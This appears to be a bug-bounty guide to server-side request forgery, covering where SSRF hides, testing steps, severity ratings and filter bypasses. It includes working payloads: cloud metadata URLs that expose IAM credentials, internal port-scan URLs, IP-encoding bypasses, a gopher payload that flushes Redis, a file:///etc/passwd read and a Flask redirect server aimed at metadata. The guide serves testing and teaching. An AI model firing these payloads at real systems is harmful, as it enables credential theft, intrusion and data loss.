# SSRF — Server-Side Request Forgery

> **Severity:** P1–P2  
> **Frequency:** Common, especially in modern cloud apps  
> **Payout range:** $500–$10,000+

---

## What It Is

SSRF forces the server to make HTTP requests to an attacker-controlled destination. The server becomes your proxy — you can reach internal services, cloud metadata, and systems that are otherwise firewalled from you.

---

## Why It Pays So Well

On cloud-hosted apps (AWS, GCP, Azure), SSRF can:
- Hit the instance metadata endpoint → steal IAM credentials → full cloud takeover
- Reach internal microservices with no auth
- Access internal admin panels
- Port scan internal infrastructure
- Read internal files via `file://` protocol

---

## Where to Find SSRF

### Classic Locations
```
- URL parameters:       ?url=, ?link=, ?src=, ?redirect=, ?next=
- Webhook endpoints:    "callback_url", "notify_url", "webhook"
- Import features:      Import from URL, fetch content, load template
- Image processing:     Profile picture from URL, image resize/convert
- PDF generators:       "Generate PDF from URL", print-to-PDF features
- File includes:        XML/SVG with external entity references
- API integrations:     Third-party service connection testing
- Ping/test features:   "Test connection" buttons in integrations
```

### Less Obvious Locations
```
- OAuth redirect_uri (can sometimes trigger server-side fetch)
- Referrer header processing
- X-Forwarded-For → internal routing
- CORS origin validation (server-side fetch to check)
- Document conversion (DOCX → PDF, HTML → PDF)
- Email clients (fetch embedded images)
- RSS/Atom feed readers
- Archive/scraping features
```

---

## Testing Methodology

### Step 1: Identify Injection Points
Search all HTTP traffic (Burp history) for:
- Parameters containing URLs, IPs, hostnames
- Features that fetch external content
- File upload with URL option

### Step 2: Basic Detection
Use an out-of-band callback server:
```
# Use Burp Collaborator or interactsh
https://YOURSERVER.burpcollaborator.net
https://YOURSERVER.oast.pro

# If you get a DNS lookup or HTTP request back → SSRF confirmed
```

### Step 3: Internal Network Probing
```
# Cloud metadata (most valuable)
http://169.254.169.254/latest/meta-data/                    # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/         # GCP
http://169.254.169.254/metadata/instance?api-version=2021-01-01  # Azure

# Internal services
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/                 # IPv6 localhost
http://internal.company.com/
http://10.0.0.1/
http://192.168.1.1/
```

### Step 4: Port Scanning
```
# Check common internal ports
http://127.0.0.1:22/    # SSH
http://127.0.0.1:3306/  # MySQL
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:27017/ # MongoDB
http://127.0.0.1:8080/  # Alt web
http://127.0.0.1:8443/  # Alt HTTPS
http://127.0.0.1:9200/  # Elasticsearch
```

---

## Bypass Techniques

### IP Representation Bypasses
```
127.0.0.1    → 2130706433 (decimal)
127.0.0.1    → 0x7f000001 (hex)
127.0.0.1    → 0177.0.0.1 (octal)
127.0.0.1    → 127.1 (short form)
127.0.0.1    → 127.000.000.001
localhost    → LOCALHOST, LocalHost
```

### DNS Rebinding Bypass
Use a domain you control that resolves to 127.0.0.1:
```
# Services: nip.io, sslip.io
http://127.0.0.1.nip.io/
```

### URL Encoding / Double Encoding
```
http://127.0.0.1/  →  http://127.0.0.1%2F
@127.0.0.1/        → Trick parsers into treating this as auth
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis via Gopher
dict://127.0.0.1:6379/info
file:///etc/passwd
```

### Redirect Chain
Host a page at your server that redirects to internal:
```python
# Flask redirect server
from flask import redirect
@app.route('/')
def r():
    return redirect("http://169.254.169.254/latest/meta-data/")
```

---

## Proof of Concept

Strong SSRF PoC:
1. Show the request that triggers SSRF
2. Show the response containing internal data OR
3. Show DNS/HTTP callback from your collaborator server
4. If cloud metadata: show the response with IAM role name at minimum
5. Explain the full impact chain

---

## Severity Assessment

| What You Got | Severity |
|-------------|---------|
| AWS/GCP/Azure credentials via metadata | P1 Critical |
| Internal admin panel access | P1 Critical |
| Internal API access (no auth) | P1–P2 |
| Port scan / service discovery | P2 |
| Blind SSRF (callback only, no data) | P2–P3 |
| SSRF to external URLs only (no internal) | P3–P4 |

---

## Resources

- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
